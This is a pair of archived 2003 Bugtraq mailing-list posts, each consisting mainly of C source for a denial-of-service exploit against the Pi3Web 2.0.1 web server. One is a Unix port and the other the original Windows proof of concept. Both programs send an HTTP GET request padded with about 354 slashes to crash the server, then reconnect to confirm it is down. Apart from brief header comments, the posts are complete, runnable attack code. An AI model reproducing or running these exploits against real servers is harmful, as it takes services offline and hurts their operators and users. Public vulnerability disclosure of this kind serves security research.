=== Content from marc.info_d0fd4f95_20250124_225733.html ===

```
[[prev in list](?l=bugtraq&m=105275737009702&w=2)] [[next in list](?l=bugtraq&m=105275789510252&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105449392713497&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Unix Version of the Pi3web DoS](?t=105275792200009&r=1&w=2)
From:       [Angelo Rosiello <guilecool () usa ! com>](?a=104698075300002&r=1&w=2)
Date:       [2003-05-12 15:49:45](?l=bugtraq&r=1&w=2&b=200305)
[Download RAW [message](?l=bugtraq&m=105275789410250&q=mbox) or [body](?l=bugtraq&m=105275789410250&q=raw)]

<http://www.rosiello.org>
Rosiello Security

* Unix Version of the Pi3web DoS.
 * ----------------------------------------------------------
 * Info: Pi3Web Server is vulnerable to a denial of Service.
 * ----------------------------------------------------------
 * VULNERABILITY:
 * GET //// <- 354
 *
 * The bug was found by aT4r@3wdesign.es 04/26/2003
 * [www.3wdesign.es](http://www.3wdesign.es) Security
 * ----------------------------------------------------------
 * Unix Version Credits.
 * AUTHOR : Angelo Rosiello
 * CONTACT: angelo@rosiello.org, angelo@dtors.net
 *
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <assert.h>

void addr_initialize();

int main(int argc, char **argv)
{
  int i, port, sd, rc;
  char buffer[355];
  char *get = "GET";
  char packet[360];
  struct sockaddr_in server;

  if(argc > 3 || argc < 2)
  {
    printf("USAGE: %s IP PORT\n", argv[[0]](#0));
    printf("e.g. ./pi3web-DoS 127.0.0.1 80\n");
    exit(0);
  }
  if(argc == 2) port = 80;
  else port = atoi(argv[[2]](#2));

  for(i = 0; i < 355; i++) buffer[i] = '/'; //Build the malformed request
  sprintf(packet, "%s %s\n", get, buffer);
  addr_initialize(&server, port, (long)inet_addr(argv[[1]](#1)));

  sd = socket(AF_INET, SOCK_STREAM, 0);
  if(sd < 0) perror("Socket");
  assert(sd >= 0);
  rc = connect(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0) perror("Connect");
  assert(rc == 0);
  printf("\n\t\t(c) 2003 DTORS Security\n");
  printf("\t\tUnix Version DoS for Pi3web\n");
  printf("\t\tby Angelo Rosiello\n\n");
  write(sd, packet, strlen(packet)); //Caput!
  printf("Malformed packet sent!\n");
  close(sd);

  printf("Checking if the server crashed...\n");
  sleep(3);

  sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd < 0) perror("Socket");
  assert(sd >= 0);
  rc = connect(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0)
  {
    printf("The server is dead!\n");
    exit(0);
  }
  else if(rc == 0) printf("The server is not vulnerable!\n");
  close(sd);
  exit(0);
}

void addr_initialize (struct sockaddr_in *address, int port, long IPaddr)
{
        address -> sin_family = AF_INET;
        address -> sin_port = htons((u_short)port);
        address -> sin_addr.s_addr = IPaddr;
}

/*EOF*/
[[prev in list](?l=bugtraq&m=105275737009702&w=2)] [[next in list](?l=bugtraq&m=105275789510252&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105449392713497&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_7e54d4b7_20250124_225732.html ===

```
[[prev in list](?l=bugtraq&m=105156094815072&w=2)] [[next in list](?l=bugtraq&m=105155734411836&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105449483514134&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Pi3Web 2.0.1 DoS](?t=105155849100004&r=1&w=2)
From:       ["aT4r InsaN3" <at4r () hotmail ! com>](?a=105155832200003&r=1&w=2)
Date:       [2003-04-28 18:17:11](?l=bugtraq&r=1&w=2&b=200304)
[Download RAW [message](?l=bugtraq&m=105155818012718&q=mbox) or [body](?l=bugtraq&m=105155818012718&q=raw)]

/* Pi3Web 2.0.1 DoS - Pr00f of concept.
*
* Vulnerable systems: Pi3Web 2.0.1 (maybe others)
* Vendor: [www.johnroy.com/pi3](http://www.johnroy.com/pi3)  - <http://pi3web.sourceforge.net/>
* Patch: no yet.
*
* Info: Pi3Web Server is vulnerable to a denial of Service.
*		when a malformed HTTP Request is done the webserver hangs due to an stack
overflow.
* 		GET /////////..[354]../////////
*
* Found by aT4r@3wdesign.es  04/26/2003
* Copyright (c) 2003 [www.3wdesign.es](http://www.3wdesign.es) Security
* THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTIES.
* USE IT AT YOUR OWN RISK.
*
* #haxorcitos @ efnet Rocks!!!
* Feel The p0wer of aT4r, Drakar, [Back], |tyr|, Tarako, croulder
* Compiled with: lcc-win32 v3.3.
*
*/
#pragma comment (lib,"ws2_32")
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <string.h>

char evilbuffer[1024],evilrequest[512],ip[[15]](#15);
short port=80;

int isalive(int OPT)
{
	struct sockaddr_in haxorcitos;
	int fd;

	haxorcitos.sin_port = htons(port);
	haxorcitos.sin_family = AF_INET;
	haxorcitos.sin_addr.s_addr = inet_addr(ip);

	if ((fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
	{
		printf(" [-] Unable to Create Socket\n\n");
		return(0);
	}
	if (connect(fd,( struct sockaddr *)&haxorcitos,sizeof(haxorcitos)) == -1)
	{
		if (OPT==0)
			printf(" [+] Exploit Success. Remote webserver shutdown\n");
		else
			printf(" [-] Unable to connect\n\n");
		return(0);
	}
	if (OPT==0)
	{
		printf(" [-] Exploit Failed. System Patched?\n\n");
	}
	else
	{
		send(fd,evilbuffer, strlen(evilbuffer),0);
		printf(" [+] Data Sent. Now Checking Host\n");
		closesocket(fd);

	}
return(1);
}

void usage(void)
{
	printf(" [+] Usage: PiDoS.exe HOST [port]\n\n");	exit(1);
}

void main(int argc,char *argv[])
{
	WSADATA ws;

	if	(WSAStartup( MAKEWORD(1,1), &ws )!=0)
	{
		printf(" [+] WSAStartup() error\n");
		exit(0);
	}

	printf("\n . .. ...:Pi3Web Denial of Service (aT4r@3wdesign.es) :...
..\n\n");

	if ((argc!=2) && (argc!=3))
		usage();

	strcpy(ip,argv[[1]](#1));
	if (argc==3) port=atoi(argv[[2]](#2));

	memset(evilrequest,0,512);
	memset(evilbuffer,0,1024);
	memset(evilrequest,'/',354);
	//sprintf(evilbuffer, "GET %s\r\n",evilrequest);
	sprintf(evilbuffer,"GET %s HTTP/1.0\r\nUser-Agent: foo\r\nHost:
%s\r\n\r\n\r\n",evilrequest,argv[[2]](#2));

	if (isalive(1))
		{ sleep(1000); isalive(0);}

}

_________________________________________________________________
Multiplica por cinco el tamaño de tu buzón de correo y envía adjuntos de
hasta 2 Mb con MSN Almacenamiento Extra. <http://join.msn.com/?pgmarket=es-es>

[[prev in list](?l=bugtraq&m=105156094815072&w=2)] [[next in list](?l=bugtraq&m=105155734411836&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=105449483514134&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


